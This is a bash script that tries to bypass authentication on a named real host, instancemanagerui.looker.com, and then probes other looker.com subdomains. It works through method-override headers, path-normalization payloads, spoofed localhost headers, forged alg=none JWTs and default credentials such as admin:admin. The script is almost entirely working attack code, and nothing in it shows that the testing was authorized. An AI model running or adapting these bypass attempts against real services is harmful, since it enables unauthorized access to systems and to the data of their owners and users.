#!/usr/bin/env bash
# looker-auth-bypass.sh — auth bypass attempts on instancemanagerui.looker.com
# All paths returned 401. Try known bypass techniques before giving up.
set -uo pipefail

TARGET="instancemanagerui.looker.com"
OUT_DIR="results/wiz.io/evidence/looker-instancemgr"
mkdir -p "$OUT_DIR"

RED='\033[0;31m'; YLW='\033[1;33m'; GRN='\033[0;32m'; BLU='\033[0;34m'; NC='\033[0m'
hit()  { echo -e "${GRN}[HIT]${NC} $*"; }
info() { echo -e "${BLU}[INF]${NC} $*"; }
warn() { echo -e "${YLW}[WRN]${NC} $*"; }

_code() { curl -sk --max-time 10 -H "User-Agent: Mozilla/5.0" -o /dev/null -w "%{http_code}" "$1" 2>/dev/null; }
_full() { curl -sk --max-time 10 -H "User-Agent: Mozilla/5.0" "$1" 2>/dev/null; }

echo "═══════════════════════════════════════════════════"
echo " PHASE A — Baseline reachability"
echo "═══════════════════════════════════════════════════"

info "DNS resolution for $TARGET..."
dig +short A "$TARGET"
dig +short CNAME "$TARGET"

info "Full headers on /..."
curl -sk --max-time 10 -H "User-Agent: Mozilla/5.0" -I "https://$TARGET/" 2>/dev/null
echo ""

echo "═══════════════════════════════════════════════════"
echo " PHASE B — Method override bypass"
echo "═══════════════════════════════════════════════════"

# Some middleware checks auth based on method; override might bypass
info "Testing HTTP method overrides..."
for _OVERRIDE_HDR in "X-HTTP-Method-Override: GET" "X-Method-Override: GET" "_method=GET"; do
  CODE=$(curl -sk --max-time 10 -X POST \
    -H "User-Agent: Mozilla/5.0" \
    -H "$_OVERRIDE_HDR" \
    -o /dev/null -w "%{http_code}" \
    "https://$TARGET/" 2>/dev/null)
  [[ "$CODE" != "401" && "$CODE" != "000" ]] && hit "Method override '$_OVERRIDE_HDR' → HTTP $CODE"
done

echo "═══════════════════════════════════════════════════"
echo " PHASE C — Path confusion / URL normalization bypass"
echo "═══════════════════════════════════════════════════"

info "Testing path-based auth bypass patterns..."
BYPASS_PATHS=(
  "/" "/index.html" "/index.htm"
  "//" "///" "/%2f" "/%2F/"
  "/./index" "/../index"
  "/api/../" "/api/./"
  "/?x=../../../"
  "/;/" "/;a=b/"           # Spring Security bypass
  "/..;/"                  # Tomcat bypass
  "/%20/" "/%09/"
  "/static/../"
  "/./" "/./."
  "/#skip_auth"
  "/?__bypass=1"
)

for _PATH in "${BYPASS_PATHS[@]}"; do
  CODE=$(_code "https://$TARGET${_PATH}")
  if [[ "$CODE" != "401" && "$CODE" != "000" && "$CODE" != "404" ]]; then
    hit "Path bypass '$_PATH' → HTTP $CODE"
    _full "https://$TARGET${_PATH}" | head -c 500
  fi
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE D — Header-based bypass"
echo "═══════════════════════════════════════════════════"

info "Testing auth bypass headers..."
BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Original-URL: /"
  "X-Rewrite-URL: /"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Forwarded-For: ::1"
  "True-Client-IP: 127.0.0.1"
  "Client-IP: 127.0.0.1"
  "Authorization: Basic YWRtaW46YWRtaW4="   # admin:admin
  "Authorization: Basic YWRtaW46cGFzc3dvcmQ="  # admin:password
  "Authorization: Bearer null"
  "Authorization: Bearer undefined"
  "Authorization: Bearer "
)

for _HDR in "${BYPASS_HEADERS[@]}"; do
  CODE=$(curl -sk --max-time 10 \
    -H "User-Agent: Mozilla/5.0" \
    -H "$_HDR" \
    -o /dev/null -w "%{http_code}" \
    "https://$TARGET/" 2>/dev/null)
  if [[ "$CODE" != "401" && "$CODE" != "000" && "$CODE" != "404" ]]; then
    hit "Header bypass '$_HDR' → HTTP $CODE"
  fi
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE E — JWT attack (alg=none)"
echo "═══════════════════════════════════════════════════"

info "Testing JWT alg=none bypass..."
# Build a JWT with alg=none
ALG_NONE_HDR=$(python3 -c "import base64,json; print(base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode())" 2>/dev/null)
ALG_NONE_PAY=$(python3 -c "import base64,json,time; print(base64.b64encode(json.dumps({'sub':'1','email':'admin@example.com','role':'admin','iat':int(time.time()),'exp':int(time.time())+86400}).encode()).rstrip(b'=').decode())" 2>/dev/null)

if [[ -n "$ALG_NONE_HDR" && -n "$ALG_NONE_PAY" ]]; then
  ALG_NONE_JWT="${ALG_NONE_HDR}.${ALG_NONE_PAY}."
  info "Testing JWT alg=none token..."
  CODE=$(curl -sk --max-time 10 \
    -H "Authorization: Bearer $ALG_NONE_JWT" \
    -H "User-Agent: Mozilla/5.0" \
    -o /dev/null -w "%{http_code}" \
    "https://$TARGET/" 2>/dev/null)
  if [[ "$CODE" != "401" && "$CODE" != "000" ]]; then
    hit "JWT alg=none bypass! HTTP $CODE"
    curl -sk --max-time 10 \
      -H "Authorization: Bearer $ALG_NONE_JWT" \
      -H "User-Agent: Mozilla/5.0" \
      "https://$TARGET/" | head -c 1000
  else
    info "JWT alg=none → HTTP $CODE (not vulnerable)"
  fi
fi

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE F — Default / weak credentials"
echo "═══════════════════════════════════════════════════"

info "Checking for basic auth prompt details..."
AUTH_HDR=$(curl -sk --max-time 10 -I "https://$TARGET/" 2>/dev/null | grep -i "www-authenticate" | head -1)
echo "Auth challenge: $AUTH_HDR"

if echo "$AUTH_HDR" | grep -qi "basic"; then
  info "Basic auth — testing default credentials..."
  for _CRED in "admin:admin" "admin:password" "admin:looker" "looker:looker" "admin:" ":"; do
    _ENC=$(echo -n "$_CRED" | base64)
    CODE=$(curl -sk --max-time 10 \
      -H "Authorization: Basic $_ENC" \
      -H "User-Agent: Mozilla/5.0" \
      -o /dev/null -w "%{http_code}" \
      "https://$TARGET/" 2>/dev/null)
    [[ "$CODE" != "401" && "$CODE" != "000" ]] && hit "Default creds '$_CRED' → HTTP $CODE"
  done
fi

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE G — API endpoint discovery (401 bypass attempt)"
echo "═══════════════════════════════════════════════════"

info "Probing non-standard paths that might bypass auth middleware..."
INTERESTING_PATHS=(
  "/health" "/healthz" "/status" "/ping" "/metrics"
  "/actuator" "/actuator/health" "/actuator/info" "/actuator/env"
  "/.well-known/security.txt" "/robots.txt" "/sitemap.xml"
  "/api" "/api/v1" "/api/v2" "/v1" "/v2"
  "/swagger" "/swagger-ui.html" "/openapi.json" "/api-docs"
  "/graphql" "/api/graphql"
  "/login" "/signin" "/auth"
  "/static/" "/assets/" "/public/"
  "/favicon.ico" "/manifest.json"
  "/__status" "/__health" "/__version"
)

for _PATH in "${INTERESTING_PATHS[@]}"; do
  CODE=$(_code "https://$TARGET${_PATH}")
  case "$CODE" in
    200) hit "HTTP 200 (no auth!) https://$TARGET${_PATH}" ;;
    301|302) REDIR=$(curl -sk --max-time 8 -o /dev/null -w "%{redirect_url}" -H "User-Agent: Mozilla/5.0" "https://$TARGET${_PATH}" 2>/dev/null)
             info "HTTP $CODE → $REDIR" ;;
    403) warn "HTTP 403 (forbidden, not 401) https://$TARGET${_PATH}" ;;
    404) : ;;
    *) [[ "$CODE" != "000" ]] && info "HTTP $CODE https://$TARGET${_PATH}" ;;
  esac
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE H — Other looker.com subdomains"
echo "═══════════════════════════════════════════════════"

info "Probing interesting Looker subdomains..."
LOOKER_SUBS=(
  "instancemanagerui"
  "api"
  "admin"
  "internal"
  "staging"
  "dev"
  "test"
  "trial"
  "selfservice"
  "portal"
  "cloud"
  "manage"
)

for _SUB in "${LOOKER_SUBS[@]}"; do
  _HOST="${_SUB}.looker.com"
  IP=$(dig +short A "$_HOST" 2>/dev/null | head -1)
  if [[ -n "$IP" ]]; then
    CODE=$(_code "https://$_HOST/")
    case "$CODE" in
      200) hit "HTTP 200: https://$_HOST/ (IP: $IP)" ;;
      301|302) info "HTTP $CODE: https://$_HOST/ → $(curl -sk --max-time 8 -o /dev/null -w '%{redirect_url}' "https://$_HOST/" 2>/dev/null)" ;;
      401) warn "HTTP 401 (needs auth): https://$_HOST/" ;;
      403) warn "HTTP 403: https://$_HOST/" ;;
      *) [[ "$CODE" != "000" ]] && info "HTTP $CODE: https://$_HOST/" ;;
    esac
  fi
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " SUMMARY"
echo "═══════════════════════════════════════════════════"
echo "Evidence saved to: $OUT_DIR/"
echo "If no bypass found: instancemanagerui.looker.com is auth-gated."
echo "Next: Check if there's a trial/demo path, or pivot to other Looker surfaces."
